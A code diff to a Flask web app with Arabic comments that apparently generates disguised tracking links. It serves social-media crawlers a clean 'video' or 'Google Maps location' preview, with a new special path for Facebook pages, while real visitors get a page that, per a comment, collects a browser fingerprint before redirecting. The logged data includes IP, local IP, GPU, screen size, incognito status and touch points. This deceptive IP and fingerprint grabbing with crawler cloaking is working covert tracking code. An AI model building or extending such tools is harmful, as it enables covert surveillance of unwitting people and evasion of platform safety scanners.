@@ -54,6 +54,20 @@ def init_db():
 
 init_db()
 
+# 🛠️ دالة مساعدة لتسجيل بيانات البوتات في قاعدة البيانات
+def log_bot_click(link_id, ip_address, ua_raw, bot_detected):
+    current_time = get_gmt1_time()
+    with sqlite3.connect(DB_FILE) as conn:
+        cursor = conn.cursor()
+        cursor.execute('''
+            INSERT INTO clicks (link_id, ip, local_ip, device, device_model, time, language, screen_size, gpu, incognito, touch_points, referrer) 
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        ''', (
+            link_id, ip_address, "N/A (Bot Entry)", ua_raw, bot_detected, current_time,
+            "N/A", "N/A (Platform Crawler)", "N/A", "Bot Link Scan/Preview", "No", "Platform Pre-fetch System"
+        ))
+        conn.commit()
+
 def guess_device_by_hardware(ua_string, gpu, touch_points):
     gpu_upper = gpu.upper()
     ua_upper = ua_string.upper()
@@ -84,7 +98,6 @@ def fetch_original_meta(url, manual_thumb_url=None):
     title = "Watch Trending Video Content in HD Quality"
     img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
     
-    # 1. تخصيص يدوي للمنصات الصعبة (تيك توك، فيسبوك، إنستغرام)
     if manual_thumb_url and manual_thumb_url.strip():
         img_final = manual_thumb_url.strip()
         if img_final.startswith('http://'):
@@ -98,7 +111,6 @@ def fetch_original_meta(url, manual_thumb_url=None):
             title = "TikTok Video Content Player"
         return title, img_final
         
-    # 2. معالجة روابط يوتيوب تلقائياً بالكامل وتصحيح التعبيرات البرمجية
     if "youtube.com" in url_lower or "youtu.be" in url_lower:
         title = "YouTube Video Stream Player HD"
         video_id = None
@@ -120,7 +132,6 @@ def fetch_original_meta(url, manual_thumb_url=None):
             img = f"https://img.youtube.com/vi/{video_id}/hqdefault.jpg"
         return title, img
 
-    # 3. معالجة روابط خرائط قوقل تلقائياً
     if "goo.gl/maps" in url_lower or "maps.google" in url_lower:
         title = "Google Maps - Realtime Location Shared"
         img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
@@ -554,8 +565,12 @@ def delete_link(link_id):
         conn.commit()
     return redirect('/my-links')
 
-@app.route('/secure/<link_id>')
-def secure_redirect(link_id):
+# =========================================================================
+# 🚀 التعديل الذكي لحماية الـ FBPage والإبقاء على استقرار باقي البوتات والميسنجر
+# =========================================================================
+@app.route('/secure/<link_id>', defaults={'subpath': ''})
+@app.route('/secure/<link_id>/<path:subpath>')
+def secure_redirect(link_id, subpath):
     ua_raw = request.headers.get('User-Agent', '')
     ua_lower = ua_raw.lower()
     
@@ -587,34 +602,64 @@ def secure_redirect(link_id):
         image_url = link_data['custom_image']
         dest_url = link_data['original_url']
         
+        meta_tags = f'<meta property="og:type" content="video.other">'
+        if target == "Telegram":
+            meta_tags = f'''
+            <meta property="og:type" content="video">
+            <meta property="og:video" content="{dest_url}">
+            <meta name="twitter:card" content="player">
+            '''
+        elif target == "Messenger":
+            meta_tags = f'<meta property="og:type" content="video.movie">'
+        elif target == "FBPage":
+            meta_tags = f'''
+            <meta property="og:type" content="article">
+            <meta property="og:image:width" content="1200">
+            <meta property="og:image:height" content="630">
+            <meta property="og:image:type" content="image/jpeg">
+            <meta name="twitter:card" content="summary_large_image">
+            '''
+
+        # 🛡️ في حال تم كشف وجود بوت زاحف (Crawler)
         if bot_detected:
             ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
             if ip_address and ',' in ip_address:
                 ip_address = ip_address.split(',')[0].strip()
                 
-            current_time = get_gmt1_time()
-            
-            with sqlite3.connect(DB_FILE) as conn:
-                cursor = conn.cursor()
-                cursor.execute('''
-                    INSERT INTO clicks (link_id, ip, local_ip, device, device_model, time, language, screen_size, gpu, incognito, touch_points, referrer) 
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-                ''', (
-                    link_id, ip_address, "N/A (Bot Entry)", ua_raw, bot_detected, current_time,
-                    "N/A", "N/A (Platform Crawler)", "N/A", "Bot Link Scan/Preview", "No", "Platform Pre-fetch System"
-                ))
-                conn.commit()
-
-            meta_tags = f'<meta property="og:type" content="video.other">'
-            if target == "Telegram":
-                meta_tags = f'''
-                <meta property="og:type" content="video">
-                <meta property="og:video" content="{dest_url}">
-                <meta name="twitter:card" content="player">
-                '''
-            elif target == "Messenger":
-                meta_tags = f'<meta property="og:type" content="video.movie">'
+            # تسجيل الزيارة في قاعدة البيانات عبر الدالة الموحدة المضافة بالأعلى
+            log_bot_click(link_id, ip_address, ua_raw, bot_detected)
                 
+            # ✨ [معالجة خاصة وحصرية لـ FBPage] بدون Meta Refresh
+            if target == "FBPage":
+                return f'''
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta charset="UTF-8">
+                    <title>{title}</title>
+                    <meta property="og:title" content="{title}">
+                    <meta property="og:description" content="▶ Click to watch full video content.">
+                    <meta property="og:image" content="{image_url}">
+                    <meta property="og:image:secure_url" content="{image_url}">
+                    <meta property="og:image:type" content="image/jpeg">
+                    <meta property="og:image:width" content="1200">
+                    <meta property="og:image:height" content="630">
+                    <meta property="og:url" content="{request.base_url}">
+                    <meta name="twitter:card" content="summary_large_image">
+                    <meta name="twitter:title" content="{title}">
+                    <meta name="twitter:image" content="{image_url}">
+                    {meta_tags}
+                </head>
+                <body style="margin:0;padding:0;background:#fff;">
+                    <div style="text-align:center;padding:20px;font-family:Arial;">
+                        <img src="{image_url}" style="max-width:100%;" alt="Video preview">
+                        <h3>{title}</h3>
+                    </div>
+                </body>
+                </html>
+                '''
+            
+            # 🔄 المعالجة التقليدية المعتادة لباقي المنصات (مثل Messenger و Telegram) مع الـ Refresh
             return f'''
             <!DOCTYPE html>
             <html>
@@ -637,16 +682,7 @@ def secure_redirect(link_id):
             </html>
             '''
 
-        meta_tags = f'<meta property="og:type" content="video.other">'
-        if target == "Telegram":
-            meta_tags = f'''
-            <meta property="og:type" content="video">
-            <meta property="og:video" content="{dest_url}">
-            <meta name="twitter:card" content="player">
-            '''
-        elif target == "Messenger":
-            meta_tags = f'<meta property="og:type" content="video.movie">'
-
+        # 👤 للمستخدمين الحقيقيين (إظهار صفحة جلب البصمة ثم التوجيه)
         return f'''
         <!DOCTYPE html>
         <html lang="en">
